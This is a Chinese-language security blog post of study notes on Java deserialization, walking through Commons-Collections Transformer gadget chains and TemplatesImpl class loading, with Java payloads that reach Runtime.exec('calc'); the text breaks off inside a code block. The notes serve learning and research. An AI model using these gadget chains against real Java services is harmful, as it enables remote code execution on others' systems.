<!DOCTYPE html>
<html lang="en">

<!-- Head tag (contains Google-Analytics、Baidu-Tongji)-->
<head>
  <!-- Google Analytics -->
  
    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-V3C5GQ73TE"></script>
    <script type="text/javascript">
      window.dataLayer = window.dataLayer || [];

      function gtag() {
        dataLayer.push(arguments);
      }
      gtag('js', new Date());

      gtag('config', 'G-V3C5GQ73TE');
    </script>
  

  <!-- Baidu Tongji -->
  
    <script type="text/javascript">
      // Originial
      var _hmt = _hmt || [];
      (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?x";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
      })();
    </script>
  

  <!-- Baidu Push -->
  
    <script>
      (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
      })();
    </script>
  

  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>

  <meta name="google-site-verification" content="lxDfCplOZbIzjhG34NuQBgu2gdyRlAtMB4utP5AgEBc"/>
  <meta name="baidu-site-verification" content="PpzM9WxOJU"/>

  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <meta name="description" content="Morouu的大狗窝 ●&#39;◡&#39;●"/>
  <meta name="keyword" content="Morouu,morouu"/>
  <link rel="shortcut icon" href="//morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112302341051.png"/>

  <!-- Place this tag in your head or just before your close body tag. -->
  <script async="async" defer="defer" src="https://buttons.github.io/buttons.js"></script>

  
    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="/css/bootstrap.min.css"/>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/beantech.min.css"/>

    <!-- Pygments Highlight CSS -->
    <link rel="stylesheet" href="/css/highlight.css"/>
    <link rel="stylesheet" href="/css/widget.css"/>
    <link rel="stylesheet" href="/css/rocket.css"/>
    <link rel="stylesheet" href="/css/signature.css"/>
    <link rel="stylesheet" href="/css/catalog.css"/>
    <link rel="stylesheet" href="/css/livemylife.css"/>

    
      <!-- wave start -->
      <link rel="stylesheet" href="/css/wave.css"/>
      <!-- wave end -->
    

    
      <!-- top start (article top hot config) -->
      <link rel="stylesheet" href="/css/top.css"/>
      <!-- top end -->
    

    
      <!-- ThemeColor start -->
      <link rel="stylesheet" href="/css/scroll.css"/>
      <!-- ThemeColor end -->
    

    
      <!-- viewer start (Picture preview) -->
      <link rel="stylesheet" href="/css/viewer.min.css"/>
      <!-- viewer end -->
    

    
      <!-- Search start -->
      <link rel="stylesheet" href="/css/search.css"/>
      <!-- Search end -->
    

    
      <!-- ThemeColor start -->
      <link rel="stylesheet" href="/css/themecolor.css"/>
      <!-- ThemeColor end -->
    

    

    
  

  <!-- Custom Fonts -->
  <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
  <!-- Hux change font-awesome CDN to qiniu -->
  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" type="text/css">
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">

  <!-- Hux Delete, sad but pending in China <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'> <link
  href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/ css'> -->

  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
  <!--[if lt IE 9]> <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script> <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script> <![endif]-->

  <!-- ga & ba script hoook -->
  <link rel="canonical" href="https://morblog.cc/posts/320531414/">
  <title>
    
      学习笔记 - java反序列化(一) - Morouu的大狗窝 ●&#39;◡&#39;●
    
  </title>
<meta name="generator" content="Hexo 5.4.0"></head>


<!-- hack iOS CSS :active style -->

	<body ontouchstart="" class="body--light body--light">


		<!-- ThemeColor -->
		
		<!-- ThemeColor -->
<style type="text/css">
  .body--light {
    --light-mode: none;
    --dark-mode: block;
  }
  .body--dark {
    --light-mode: block;
    --dark-mode: none;
  }
  i.mdui-icon.material-icons.light-mode {
    display: var(--light-mode);
  }
  i.mdui-icon.material-icons.dark-mode {
    display: var(--dark-mode);
  }
</style>
<div class="toggle" onclick="document.body.classList.toggle('body--dark')">
  <i class="mdui-icon material-icons light-mode"></i>
  <i class="mdui-icon material-icons dark-mode"></i>
</div>
<script>
  //getCookieValue
  function getCookieValue(a) {
    var b = document.cookie.match('(^|[^;]+)\\s*' + a + '\\s*=\\s*([^;]+)');
    return b
      ? b.pop()
      : '';
  }
  let themeMode = 'light';
  if (getCookieValue('sb-color-mode') && (getCookieValue('sb-color-mode') !== themeMode)) {
    let dbody = document.body.classList;
    themeMode === 'dark' ? dbody.remove('body--dark') : dbody.add('body--dark');
  }

  //setCookieValue
  var toggleBtn = document.querySelector(".toggle");
  toggleBtn.addEventListener("click", function () {
    var e = document.body.classList.contains("body--dark");
    var cookieString = e
      ? "dark"
      : "light";
    var exp = new Date();
    exp.setTime(exp.getTime() + 3 * 24 * 60 * 60 * 1000); //3天过期
    document.cookie = "sb-color-mode=" + cookieString + ";expires=" + exp.toGMTString() + ";path=/";
  });
</script>

		

		<!-- Gitter -->
		
		<!-- Gitter -->
<!-- Docs:https://gitter.im/?utm_source=left-menu-logo -->
<script>
  ((window.gitter = {}).chat = {}).options = {
    room: 'dmantick/morcruiser'
  };
</script>
<script src="https://sidecar.gitter.im/dist/sidecar.v1.js" async defer></script>

		

		<!-- Navigation (contains search)-->
		<!-- Navigation -->
<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
  <div class="container-fluid">
    <!-- Brand and toggle get grouped for better mobile display -->
    <div class="navbar-header page-scroll">
      <button type="button" class="navbar-toggle">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="/">Morouu的大狗窝 ●&#39;◡&#39;●</a>
    </div>

    <!-- Collect the nav links, forms, and other content for toggling -->
    <!-- Known Issue, found by Hux: <nav>'s height woule be hold on by its content. so, when navbar scale out, the <nav> will cover tags. also mask any touch event of tags, unfortunately. -->
    <div id="huxblog_navbar">
      <div class="navbar-collapse">
        <ul class="nav navbar-nav navbar-right">
          <li>
            <a href="/">首页</a>
          </li>

          
          
          
          
          <li>
            <a href="/about/">
              
              关于
              
              
            </a>
          </li>
          
          
          
          <li>
            <a href="/categories/">
              
              分类
              
              
            </a>
          </li>
          
          
          
          <li>
            <a href="/archive/">
              
              归档
              
              
            </a>
          </li>
          
          
          
          <li>
            <a href="/tags/">
              
              标签
              
              
            </a>
          </li>
          
          

          
          <li>
            <a class="popup-trigger">
              <span class="search-icon"></span>搜索</a>
          </li>
          

          <!-- LangSelect -->
          
          
          
          
          
        </ul>
      </div>
    </div>
    <!-- /.navbar-collapse -->
  </div>
  <!-- /.container -->
</nav>
<!-- progress -->
<div id="progress">
  <div class="line" style="width: 0%;"></div>
</div>

<script>
  // Drop Bootstarp low-performance Navbar Use customize navbar with high-quality material design animation in high-perf jank-free CSS3 implementation
  var $body = document.body;
  var $toggle = document.querySelector('.navbar-toggle');
  var $navbar = document.querySelector('#huxblog_navbar');
  var $collapse = document.querySelector('.navbar-collapse');

  $toggle.addEventListener('click', handleMagic)

  function handleMagic(e) {
    if ($navbar.className.indexOf('in') > 0) {
      // CLOSE
      $navbar.className = " ";
      // wait until animation end.
      setTimeout(function() {
        // prevent frequently toggle
        if ($navbar.className.indexOf('in') < 0) {
          $collapse.style.height = "0px"
        }
      }, 400)
    } else {
      // OPEN
      $collapse.style.height = "auto"
      $navbar.className += " in";
    }
  }
</script>


		<!-- Post Header (contains intro-header、signature、wordcount、busuanzi、waveoverlay) -->
		<!-- Modified by Yu-Hsuan Yen -->
<!-- Post Header -->

  <style type="text/css">
    .body--light {
      /* intro-header */
      --intro-header-background-image-url-home: url('//morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112302332090.jpg');
      --intro-header-background-image-url-post: url('https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171819459.png?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
      --intro-header-background-image-url-page: url('/https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171819459.png?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
    }
    .body--dark {
      --intro-header-background-image-url-home: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('//morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112302332090.jpg');
      --intro-header-background-image-url-post: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171819459.png?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
      --intro-header-background-image-url-page: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171819459.png?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
    }

    header.intro-header {
       /*post*/
        background-image: var(--intro-header-background-image-url-post);
        /* background-image: url('https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171819459.png?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080'); */
      
    }

    
      #signature {/*signature*/
        background-image: url('//morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112302343273.png');
      }
    
  </style>





<header class="intro-header">
  <!-- Signature -->
  <div id="signature">
    <div class="container">
      <div class="row">
        <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
          
          <div class="post-heading">
            <div class="tags">
              
              <a class="tag" href="/tags/#安全" title="安全">安全</a>
              
              <a class="tag" href="/tags/#JAVA" title="JAVA">JAVA</a>
              
              <a class="tag" href="/tags/#漏洞" title="漏洞">漏洞</a>
              
              <a class="tag" href="/tags/#反序列化" title="反序列化">反序列化</a>
              
            </div>
            <h1>学习笔记 - java反序列化(一)</h1>
            <h2 class="subheading"></h2>
            <span class="meta">
              Posted by morouu on
              2022-02-17
            </span>


            
            <!-- WordCount start -->
            <div class="blank_box"></div>
            <span class="meta">
              Estimated Reading Time <span class="post-count" >62</span> Minutes
            </span>
            <div class="blank_box"></div>
            <span class="meta">
              Words <span class="post-count">13.5k</span> In Total
            </span>
            <div class="blank_box"></div>
            <!-- WordCount end -->
            
            
            <!-- 不蒜子统计 start -->
            <span class="meta" id="busuanzi_container_page_pv">
              Viewed <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> Times
            </span>
            <!-- 不蒜子统计 end -->
            


          </div>
          
        </div>
      </div>
    </div>
  </div>

  
  <!-- waveoverlay start -->
  <div class="preview-overlay">
    <svg class="preview-waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
      <defs>
        <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path>
      </defs>
      <g class="preview-parallax">
        <use xlink:href="#gentle-wave" x="48" y="0" fill=var(--gentle-wave1)></use>
        <use xlink:href="#gentle-wave" x="48" y="3" fill=var(--gentle-wave2)></use>
        <use xlink:href="#gentle-wave" x="48" y="5" fill=var(--gentle-wave3)></use>
        <use xlink:href="#gentle-wave" x="48" y="7" fill=var(--gentle-wave)></use>
      </g>
    </svg>
  </div>
  <!-- waveoverlay end -->
  

</header>



		<!-- Main Content (Post contains
	Pager、
	tip、
	socialshare、
	gitalk、gitment、disqus-comment、
	Catalog、
	Sidebar、
	Featured-Tags、
	Friends Blog、
	anchorjs、
	) -->
		<!-- Modify by Yu-Hsuan Yen -->
<!-- Post Content -->
<article>
  <div class="container" style="margin-left: 10%;">
    <div class="row">
      <!-- Post Container -->
      <div class="col-lg-10 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">

        <h1 id="学习笔记-java反序列化-一"><a href="#学习笔记-java反序列化-一" class="headerlink" title="学习笔记 - java反序列化(一)"></a>学习笔记 - java反序列化(一)</h1><hr>
<h2 id="前言"><a href="#前言" class="headerlink" title="- 前言 -"></a>- 前言 -</h2><p>就当作是写给自己以后翻看的学习笔记吧，如果有错误有望各位师傅伙伴们指出了0.0。另外，还有很多其他部分需要学习(不如说是把之前忘掉的部分重新复现一遍)，往后还会继续。</p>
<h2 id="前置内容"><a href="#前置内容" class="headerlink" title="- 前置内容 -"></a>- 前置内容 -</h2><h3 id="Transformer"><a href="#Transformer" class="headerlink" title="- Transformer -"></a>- Transformer -</h3><p>这个玩意是一个来自 <code>commons.collections</code> 的接口，其拥有唯一需要实现的方法 <code>transform</code> 👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150149976.png" alt="image-20220215014906831"></p>
<p>其中，实现了该接口且比较关键的类为以下👇</p>
<ul>
<li><code>InvokerTransformer</code></li>
<li><code>ConstantTransformer</code></li>
<li><code>TransformedMap</code></li>
</ul>
<p>这几个类都拥有不同的 <code>transform</code> 方法，实现了 <code>transformer</code> 接口，而且是大部分 <code>CC链</code> 的关键。</p>
<h4 id="分析"><a href="#分析" class="headerlink" title="- 分析 -"></a>- 分析 -</h4><h5 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="- InvokerTransformer -"></a>- InvokerTransformer -</h5><p>那么先来看 <code>InvokerTransformer</code> 这个类的 <code>transformer</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150159093.png" alt="image-20220215015911009"></p>
<p>可以看到其会获取传入的 <code>input</code> 参数中参数为 <code>this.iParamTypes</code> ，名称为 <code>this.iMethodName</code> 的方法，然后以 <code>this.iArgs</code> 作为参数进行调用。</p>
<p>而 <code>this.iMethodName</code> <code>this.iParamTypes</code> <code>this.iArgs</code> 是可以从 <code>InvokerTransformer</code> 类的构造方法传入，且 <code>InvokerTransformer</code> 类可序列化👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150203164.png" alt="image-20220215020324053"></p>
<p>此时就可以获取一个对 <code>任意类</code>  的 <code>任意方法</code> 传入 <code>任意参数</code> 的调用了。</p>
<h5 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="- ConstantTransformer -"></a>- ConstantTransformer -</h5><p>再来看 <code>ConstantTransformer</code> 类的 <code>transformer</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150205783.png" alt="image-20220215020511745"></p>
<p>仅是将自身的 <code>this.iConstant</code> 属性返回，同时和 <code>InvokerTransformer</code> 类一样， <code>ConstantTransformer</code> 类的 <code>this.iMethodName</code> 属性是可以通过构造方法控制且可序列化👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150207125.png" alt="image-20220215020712044"></p>
<p>这意味着可以通过 <code>ConstantTransformer</code> 类的 <code>transformer</code> 获取 <code>任意值</code> 。</p>
<h5 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="- ChainedTransformer -"></a>- ChainedTransformer -</h5><p>这个 <code>ChainedTransformer</code> 类比较特殊，一般用来对上面的 <code>InvokerTransformer</code> 类和 <code>ConstantTransformer</code> 做一个执行顺序的包装👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150210351.png" alt="image-20220215021021246"></p>
<p>可以看到 <code>ChainedTransformer</code> 类的 <code>transformer</code> 方法会将其 <code>this.iTransformers</code> 属性中每一个<code>Transformer</code> 接口元素进行 <code>transform</code> 方法的调用；在首次使用 <code>object</code> 参数作为调用 <code>tranform</code> 方法的调用参数进行调用后，将通过调用 <code>tranform</code> 方法得到的结果作为下次调用 <code>tranform</code> 方法的参数进行调用。</p>
<p>同时 <code>ChainedTransformer</code> 类的 <code>this.iTransformers</code> 属性是可以通过构造方法控制，而 <code>ChainedTransformer</code> 也是可以序列化的。</p>
<h4 id="payload"><a href="#payload" class="headerlink" title="- payload -"></a>- payload -</h4><p>那么由上面几个类就可以很容易的得到简单的 <code>payload</code> 了，比如👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        InvokerTransformer itf = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        itf.transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于 <code>Runtime</code> 这个类并不能序列化，上面的 <code>payload</code> 并不能用在 <code>反序列化</code> 上，再来个 <code>反序列化</code> 的(<code>commons.collections3.2.0</code>)👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] tfs = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer ctf = <span class="keyword">new</span> ChainedTransformer(tfs);</span><br><span class="line">        ctf.transform(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个可以支持 <code>反序列化</code> 的 <code>payload</code> 原因是在整个过程先利用 <code>ConstantTransformer</code> 类将 <code>Runtime.class</code> 获取了，然后一步步用 <code>InvokerTransformer</code> 拼装直至到对 <code>exec</code> 的调用；也就是还原了 <code>java.lang.Runtime.getRuntime().exec()</code> 的调用过程👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Method m = Runtime.class.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">Runtime r = (Runtime) m.invoke(<span class="keyword">null</span>);</span><br><span class="line">r.exec(<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>当然，以上 <code>payload</code> 触发的关键是调用了 <code>transform</code> 方法，因此在 <code>反序列化</code> 时需要通过合适的方式调用 <code>transform</code> 才可以触发，也就是得找到类似 <code>[(Transformer)可控].transform()</code> 的结构，这就到 <code>CC链</code> 的时候再说罢。</p>
<h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="- TemplatesImpl -"></a>- TemplatesImpl -</h3><p>在开始之前先回顾一下有关类初始化👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test3</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Test3</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;in Test3&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span> <span class="keyword">extends</span> <span class="title">Test3</span></span>&#123;</span><br><span class="line">	&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;init 1&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;init 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Test2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;in Test2&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;init 3&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InstantiationException, IllegalAccessException </span>&#123;</span><br><span class="line">        </span><br><span class="line">        Test2.class.newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得到结果👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">init <span class="number">2</span></span><br><span class="line">in Test3</span><br><span class="line">init <span class="number">1</span></span><br><span class="line">in Test2</span><br><span class="line">init <span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>由此可以得到这三个初始化的顺序👇</p>
<ul>
<li>第一个 <code>&#123;&#125;</code> 介于 <code>super()</code> 和构造函数内容之间。</li>
<li>第二个 <code>static&#123;&#125;</code> 在最前面。</li>
<li>第三个则是构造函数的内容，相对于前面两个在最后面。</li>
</ul>
<p>但这并不是重点，重点是一旦调用了 <code>newInstance</code> 方法，这三个初始化中的内容都会被执行。</p>
<p>那么接下来可以看 <code>TemplatesImpl</code> 类的 <code>getTransletInstance</code> 方法(<code>jdk1.8.0_11</code>)👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150322107.png" alt="image-20220215032214007"> </p>
<p>这里存在对 <code>newInstance</code> 方法的调用，那么整体思路就比较明白了，构造合适的类，通过种种方法最终来到 <code>_class[_transletIndex].newInstance()</code> 。</p>
<h4 id="分析-1"><a href="#分析-1" class="headerlink" title="- 分析 -"></a>- 分析 -</h4><p>先来看在 <code>_class[_transletIndex].newInstance()</code> 代码中的 <code>_class</code> 属性的值，这个 <code>_class</code> 属性的值内容来自 <code>defineTransletClasses</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150325308.png" alt="image-20220215032535170"></p>
<p>而 <code>loader.defineClass</code> 以 <code>_bytecodes</code> 属性作为参数进行调用得到的结果，显然 <code>_bytecodes</code> 属性的值为类的字节码。</p>
<p>再环顾 <code>TemplatesImpl</code> 整个类，在 <code>newTransformer</code> 方法存在对 <code>defineTransletClasses</code> 方法的调用👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150341634.png" alt="image-20220215033938851"></p>
<p>同时 <code>getOutputProperties</code> 方法存在对 <code>newTransformer</code> 方法的调用👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150342996.png" alt="image-20220215034044278"></p>
<p>另外，在 <code>TrAXFilter</code> 类的构造方法、 <code>TransformerFactoryImpl</code> 类的 <code>newTransformerHandler</code> 方法</p>
<p>都可以通过合理的构造以达到对 <code>TemplatesImpl</code> 类中 <code>newTransformer</code> 方法的调用，这里就不展开了。</p>
<p>那么回到 <code>TemplatesImpl</code> 类的 <code>newTransformer</code> 方法，由于前面是没有多余的条件判断，直接跟进 <code>getTransletInstance</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150355375.png" alt="image-20220215035530284"></p>
<p>首先 <code>_name</code> 和 <code>_class</code> 属性的值必须要为 <code>null</code> ，继续跟进 <code>defineTransletClasses</code> 方法👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150358039.png" alt="image-20220215035853889"></p>
<p>显然，<code>_bytecodes</code> 属性必不为 <code>null</code> 且需要为大小大于 <code>1</code> 的二维数组，以便让 <code>_auxClasses</code> 属性能够执行 <code>_auxClasses = new Hashtable()</code> 进行初始化。然后让 <code>_transletIndex</code> 属性设为 <code>0</code> ，同时保证 <code>_bytecodes</code> 属性的值如👇</p>
<ul>
<li><code>[0][]&#123;payload内容字节码&#125;</code></li>
<li><code>[1][]&#123;任意类&#125;</code></li>
<li><code>......</code></li>
</ul>
<p>至于 <code>_transletIndex</code> 的值为什么为 <code>0</code> 是方便后面执行 <code>_class[_transletIndex].newInstance()</code> 时能从 <code>_class[0]</code> 中读到 <code>payload内容字节码</code> 。当然，如果不按照上面的格式只要 <code>_transletIndex</code> 的值能够对的上 <code>_bytecodes</code> 属性所放 <code>payload内容字节码</code> 的索引也可。</p>
<p>同时 <code>TemplatesImpl</code> 类也是可以序列化的👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150419055.png" alt="image-20220215041907968"></p>
<p>最后，类的 <code>字节码</code> 的生成可以用 <code>javassist</code> 。</p>
<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="- payload -"></a>- payload -</h4><p>先是直接一点的 <code>payload</code> ，比如👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 